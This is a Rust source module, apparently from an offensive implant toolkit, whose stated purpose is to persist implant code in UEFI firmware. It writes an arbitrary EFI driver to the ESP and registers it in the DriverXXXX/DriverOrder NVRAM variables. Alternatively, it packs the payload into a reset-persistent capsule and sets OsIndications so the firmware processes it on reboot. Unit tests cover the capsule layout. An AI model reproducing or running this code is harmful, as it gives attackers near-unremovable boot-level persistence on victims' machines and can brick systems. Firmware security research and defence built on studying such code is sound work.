//! Runtime DXE driver and UEFI capsule support.
//!
//! # Overview
//!
//! Provides functionality for:
//! 1. Installing a runtime DXE driver that survives OS boot.
//! 2. Checking UEFI capsule update support.
//! 3. Using capsule updates to persist implant code in firmware.
//!
//! # DXE Drivers
//!
//! DXE (Driver Execution Environment) drivers run during boot before the OS
//! loads. A runtime DXE driver can:
//! - Survive the transition from boot services to runtime services.
//! - Provide persistent services across reboots.
//! - Modify boot configuration at the firmware level.
//!
//! # Capsule Updates
//!
//! UEFI capsule updates are a firmware update mechanism that can be used to
//! persist code. A capsule is a binary blob that the firmware processes
//! during the next boot. Capsule updates:
//! - Are processed by the firmware before the OS loads.
//! - Can update firmware, NVRAM, or other firmware-managed resources.
//! - Require `EFI_CAPSULE_SUPPORT` protocol.
//!
//! # Safety
//!
//! All operations validate inputs before committing. Capsule updates in
//! particular can brick a system if malformed.

use crate::{EfiGuid, EfiVarAttributes};
use anyhow::{bail, Context, Result};

/// EFI Capsule GUID (for capsule header).
pub const EFI_CAPSULE_GUID: EfiGuid = EfiGuid::from_parts(
    0x3B6686BD,
    0x0D76,
    0x4030,
    &[0xB7, 0x0E, 0xB5, 0x51, 0x9E, 0x2F, 0xC5, 0xA0],
);

/// EFI_FIRMWARE_MANAGEMENT_CAPSULE_ID_GUID.
pub const EFI_FIRMWARE_MANAGEMENT_CAPSULE_GUID: EfiGuid = EfiGuid::from_parts(
    0x6DCBD5ED,
    0xE82D,
    0x4C44,
    &[0xBD, 0xA1, 0x71, 0x94, 0x19, 0x9A, 0xD9, 0x2A],
);

/// OsIndications variable name.
const OS_INDICATIONS_VARIABLE: &str = "OsIndications";

/// EFI_OS_INDICATIONS_FILE_CAPSULE_DELIVERY_SUPPORTED bit.
const OS_INDICATIONS_FILE_CAPSULE_DELIVERY: u64 = 0x0000000000000004;

/// EFI_OS_INDICATIONS_CAPSULE_RESULT_VAR_SUPPORTED bit.
const OS_INDICATIONS_CAPSULE_RESULT_VAR: u64 = 0x0000000000000010;

/// Result of checking capsule support.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CapsuleSupport {
    /// Whether capsule delivery via file is supported.
    pub file_capsule_supported: bool,
    /// Whether capsule result variable is supported.
    pub capsule_result_var_supported: bool,
    /// Whether the platform supports capsule on disk.
    pub capsule_on_disk_supported: bool,
    /// Raw OsIndications value.
    pub os_indications_raw: u64,
    /// Supported OsIndications mask.
    pub os_indications_supported: u64,
}

/// Capsule header structure (EFI_CAPSULE_HEADER).
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CapsuleHeader {
    /// GUID identifying the capsule type.
    pub capsule_guid: EfiGuid,
    /// Size of the capsule header.
    pub header_size: u32,
    /// Flags (CAPSULE_FLAGS_*).
    pub flags: u32,
    /// Total size of the capsule including header.
    pub capsule_image_size: u32,
}

/// Flags for capsule headers.
pub mod capsule_flags {
    /// Persist across system reset.
    pub const PERSIST_ACROSS_RESET: u32 = 0x00010000;
    /// Populate system table.
    pub const POPULATE_SYSTEM_TABLE: u32 = 0x00020000;
    /// Initiate reset.
    pub const INITIATE_RESET: u32 = 0x00040000;
}

/// Result of installing a runtime driver.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RuntimeDriverResult {
    /// Whether the installation was successful.
    pub success: bool,
    /// Method used for installation.
    pub method: String,
    /// Path or identifier of the installed driver.
    pub location: String,
    /// SHA-256 hash of the driver.
    pub sha256_hash: String,
    /// Size of the driver.
    pub size: usize,
}

/// Result of a capsule delivery attempt.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CapsuleDeliveryResult {
    /// Whether the capsule was successfully queued.
    pub queued: bool,
    /// Path where the capsule was written.
    pub capsule_path: String,
    /// Size of the capsule.
    pub size: usize,
    /// Whether a system reset is required.
    pub reset_required: bool,
}

/// Check if the system supports UEFI capsule updates.
///
/// Reads the `OsIndicationsSupported` variable to determine capsule capabilities.
pub fn check_uefi_capsule_support() -> Result<CapsuleSupport> {
    // Read OsIndicationsSupported.
    let supported = match crate::nvram::read_efi_variable(
        "OsIndicationsSupported",
        &EfiGuid::EFI_GLOBAL_VARIABLE,
    ) {
        Ok(data) => {
            let payload = strip_attr_header(&data);
            if payload.len() >= 8 {
                u64::from_le_bytes([
                    payload[0], payload[1], payload[2], payload[3],
                    payload[4], payload[5], payload[6], payload[7],
                ])
            } else {
                0
            }
        }
        Err(e) => {
            tracing::warn!("Could not read OsIndicationsSupported: {}", e);
            0
        }
    };

    // Read current OsIndications.
    let raw = match crate::nvram::read_efi_variable(
        OS_INDICATIONS_VARIABLE,
        &EfiGuid::EFI_GLOBAL_VARIABLE,
    ) {
        Ok(data) => {
            let payload = strip_attr_header(&data);
            if payload.len() >= 8 {
                u64::from_le_bytes([
                    payload[0], payload[1], payload[2], payload[3],
                    payload[4], payload[5], payload[6], payload[7],
                ])
            } else {
                0
            }
        }
        Err(_) => 0,
    };

    Ok(CapsuleSupport {
        file_capsule_supported: (supported & OS_INDICATIONS_FILE_CAPSULE_DELIVERY) != 0,
        capsule_result_var_supported: (supported & OS_INDICATIONS_CAPSULE_RESULT_VAR) != 0,
        capsule_on_disk_supported: (supported & OS_INDICATIONS_FILE_CAPSULE_DELIVERY) != 0,
        os_indications_raw: raw,
        os_indications_supported: supported,
    })
}

/// Install a runtime DXE driver.
///
/// This installs the driver by:
/// 1. Writing it to the ESP as an EFI driver.
/// 2. Adding it to the firmware's driver load list (if supported).
/// 3. Optionally using a capsule update to load it.
///
/// **WARNING**: Runtime drivers can be extremely persistent and difficult
/// to remove. Use with caution.
pub fn install_runtime_driver(
    driver_bytes: &[u8],
    driver_name: &str,
    esp_path: &str,
    use_capsule: bool,
) -> Result<RuntimeDriverResult> {
    // Validate the driver is a valid EFI binary.
    crate::esp::validate_efi_pe(driver_bytes)
        .context("Driver bytes are not a valid EFI PE/COFF binary")?;

    // Compute hash.
    let sha256_hash = {
        use sha2::Digest;
        let mut hasher = sha2::Sha256::new();
        hasher.update(driver_bytes);
        hex::encode(hasher.finalize())
    };

    // Write the driver to the ESP.
    let write_result = crate::esp::write_efi_driver(
        esp_path,
        driver_name,
        driver_bytes,
        None,
    )?;

    if use_capsule {
        // Attempt capsule-based installation.
        let capsule_result = deliver_capsule_on_disk(esp_path, driver_name, driver_bytes)?;

        Ok(RuntimeDriverResult {
            success: true,
            method: "capsule-on-disk".to_string(),
            location: capsule_result.capsule_path,
            sha256_hash,
            size: driver_bytes.len(),
        })
    } else {
        // Use driver load list approach.
        add_to_driver_load_list(driver_name, esp_path)?;

        Ok(RuntimeDriverResult {
            success: true,
            method: "driver-load-list".to_string(),
            location: write_result.driver_path,
            sha256_hash,
            size: driver_bytes.len(),
        })
    }
}

/// Add a driver to the firmware's driver load list.
///
/// Writes to the `DriverOrder` and `DriverXXXX` NVRAM variables.
fn add_to_driver_load_list(driver_name: &str, esp_path: &str) -> Result<()> {
    // Find a free driver entry number.
    let driver_num = find_free_driver_entry()?;

    // Build the EFI_LOAD_OPTION for the driver.
    let driver_path = format!("\\EFI\\Boot\\{}.efi", driver_name);
    let dp = crate::nvram::build_file_device_path(&driver_path);
    let desc_ucs2 = crate::nvram::string_to_ucs2(driver_name);

    let mut load_option = Vec::new();
    // Attributes: ACTIVE.
    load_option.extend_from_slice(&0x00000001u32.to_le_bytes());
    // FilePathListLength.
    let total_dp_len = dp.len() + 4; // +4 for end-of-path.
    load_option.extend_from_slice(&(total_dp_len as u16).to_le_bytes());
    // Description.
    load_option.extend_from_slice(&desc_ucs2);
    // Device path.
    load_option.extend_from_slice(&dp);
    // End-of-device-path.
    load_option.extend_from_slice(&[0x7F, 0xFF, 0x04, 0x00]);

    // Write DriverXXXX variable.
    let var_name = format!("Driver{:04X}", driver_num);
    crate::nvram::write_efi_variable(
        &var_name,
        &EfiGuid::EFI_GLOBAL_VARIABLE,
        &load_option,
        EfiVarAttributes::STANDARD_BOOT,
    )
    .context("Failed to write DriverXXXX NVRAM variable")?;

    // Add to DriverOrder.
    let mut driver_order = read_driver_order()?;
    driver_order.push(driver_num);
    write_driver_order(&driver_order)?;

    Ok(())
}

/// Deliver a capsule via capsule-on-disk mechanism.
///
/// The capsule is written to the ESP's `\EFI\` directory and the
/// OsIndications variable is updated to signal the firmware to process it.
fn deliver_capsule_on_disk(
    esp_path: &str,
    capsule_name: &str,
    payload: &[u8],
) -> Result<CapsuleDeliveryResult> {
    // Check capsule support first.
    let support = check_uefi_capsule_support()?;
    if !support.capsule_on_disk_supported {
        bail!(
            "Capsule-on-disk is not supported on this platform. \
             OsIndicationsSupported: 0x{:016X}",
            support.os_indications_supported
        );
    }

    // Build the capsule.
    let capsule = build_capsule(payload)?;

    // Write the capsule to the ESP.
    let capsule_dir = std::path::PathBuf::from(esp_path)
        .join("EFI")
        .join("Capsule");
    std::fs::create_dir_all(&capsule_dir)
        .context("Failed to create Capsule directory on ESP")?;

    let capsule_path = capsule_dir.join(format!("{}.cap", capsule_name));
    std::fs::write(&capsule_path, &capsule)
        .with_context(|| format!("Failed to write capsule to {}", capsule_path.display()))?;

    // Update OsIndications to request capsule processing.
    let new_os_indications = support.os_indications_raw | OS_INDICATIONS_FILE_CAPSULE_DELIVERY;
    crate::nvram::write_efi_variable(
        OS_INDICATIONS_VARIABLE,
        &EfiGuid::EFI_GLOBAL_VARIABLE,
        &new_os_indications.to_le_bytes(),
        EfiVarAttributes::STANDARD_BOOT,
    )
    .context("Failed to update OsIndications variable")?;

    Ok(CapsuleDeliveryResult {
        queued: true,
        capsule_path: capsule_path.to_string_lossy().to_string(),
        size: capsule.len(),
        reset_required: true, // Capsule processing requires a reset.
    })
}

/// Build a UEFI capsule containing the given payload.
///
/// The capsule has a standard EFI_CAPSULE_HEADER followed by the payload.
fn build_capsule(payload: &[u8]) -> Result<Vec<u8>> {
    let header_size = 28; // sizeof(EFI_CAPSULE_HEADER) = 16 (GUID) + 4 + 4 + 4.
    let capsule_size = header_size + payload.len();

    let mut capsule = Vec::with_capacity(capsule_size);

    // ─── EFI_CAPSULE_HEADER ─────────────────────────────────────────────
    // CapsuleGuid.
    let guid_bytes = EFI_CAPSULE_GUID.to_bytes();
    capsule.extend_from_slice(&guid_bytes);

    // HeaderSize.
    capsule.extend_from_slice(&(header_size as u32).to_le_bytes());

    // Flags: PERSIST_ACROSS_RESET | INITIATE_RESET.
    let flags = capsule_flags::PERSIST_ACROSS_RESET | capsule_flags::INITIATE_RESET;
    capsule.extend_from_slice(&flags.to_le_bytes());

    // CapsuleImageSize.
    capsule.extend_from_slice(&(capsule_size as u32).to_le_bytes());

    // ─── Payload ────────────────────────────────────────────────────────
    capsule.extend_from_slice(payload);

    Ok(capsule)
}

/// Read the DriverOrder NVRAM variable.
fn read_driver_order() -> Result<Vec<u16>> {
    let data = crate::nvram::read_efi_variable("DriverOrder", &EfiGuid::EFI_GLOBAL_VARIABLE)?;
    let payload = strip_attr_header(&data);
    let mut order = Vec::new();
    for chunk in payload.chunks(2) {
        if chunk.len() == 2 {
            order.push(u16::from_le_bytes([chunk[0], chunk[1]]));
        }
    }
    Ok(order)
}

/// Write the DriverOrder NVRAM variable.
fn write_driver_order(order: &[u16]) -> Result<()> {
    let mut data = Vec::with_capacity(order.len() * 2);
    for &entry in order {
        data.extend_from_slice(&entry.to_le_bytes());
    }
    crate::nvram::write_efi_variable(
        "DriverOrder",
        &EfiGuid::EFI_GLOBAL_VARIABLE,
        &data,
        EfiVarAttributes::STANDARD_BOOT,
    )
}

/// Find a free driver entry number.
fn find_free_driver_entry() -> Result<u16> {
    for num in 0u16..=0xFF {
        let var_name = format!("Driver{:04X}", num);
        if crate::nvram::read_efi_variable(&var_name, &EfiGuid::EFI_GLOBAL_VARIABLE).is_err() {
            return Ok(num);
        }
    }
    bail!("No free driver entry numbers available");
}

/// Strip Linux efivars attribute header.
fn strip_attr_header(data: &[u8]) -> &[u8] {
    if data.len() > 4 {
        &data[4..]
    } else {
        data
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn capsule_header_serialization() {
        let header = CapsuleHeader {
            capsule_guid: EFI_CAPSULE_GUID,
            header_size: 28,
            flags: capsule_flags::PERSIST_ACROSS_RESET,
            capsule_image_size: 1024,
        };

        assert_eq!(header.header_size, 28);
        assert_eq!(header.flags, 0x00010000);
        assert_eq!(header.capsule_image_size, 1024);
    }

    #[test]
    fn build_capsule_structure() {
        let payload = vec![0xAA; 100];
        let capsule = build_capsule(&payload).unwrap();

        // Total size should be header (28) + payload (100).
        assert_eq!(capsule.len(), 128);

        // Verify GUID at offset 0.
        let guid_bytes = EFI_CAPSULE_GUID.to_bytes();
        assert_eq!(&capsule[0..16], &guid_bytes);

        // Verify HeaderSize at offset 16.
        let header_size = u32::from_le_bytes([
            capsule[16], capsule[17], capsule[18], capsule[19],
        ]);
        assert_eq!(header_size, 28);

        // Verify CapsuleImageSize at offset 24.
        let image_size = u32::from_le_bytes([
            capsule[24], capsule[25], capsule[26], capsule[27],
        ]);
        assert_eq!(image_size, 128);
    }

    #[test]
    fn capsule_flags_correct() {
        let combined = capsule_flags::PERSIST_ACROSS_RESET | capsule_flags::INITIATE_RESET;
        assert_eq!(combined, 0x00050000);
    }

    #[test]
    fn capsule_guid_format() {
        let guid_str = EFI_CAPSULE_GUID.to_string();
        assert!(guid_str.contains('-'));
        // GUID should have 5 parts: 8-4-4-4-12.
        let parts: Vec<&str> = guid_str.split('-').collect();
        assert_eq!(parts.len(), 5);
    }

    #[test]
    fn efi_firmware_management_capsule_guid() {
        let guid_str = EFI_FIRMWARE_MANAGEMENT_CAPSULE_GUID.to_string();
        assert!(guid_str.starts_with("6DCBD5ED"));
    }

    #[test]
    fn capsule_support_default() {
        let support = CapsuleSupport {
            file_capsule_supported: false,
            capsule_result_var_supported: false,
            capsule_on_disk_supported: false,
            os_indications_raw: 0,
            os_indications_supported: 0,
        };
        assert!(!support.file_capsule_supported);
        assert!(!support.capsule_result_var_supported);
    }

    #[test]
    fn os_indications_bits() {
        assert_eq!(OS_INDICATIONS_FILE_CAPSULE_DELIVERY, 0x04);
        assert_eq!(OS_INDICATIONS_CAPSULE_RESULT_VAR, 0x10);
    }
}
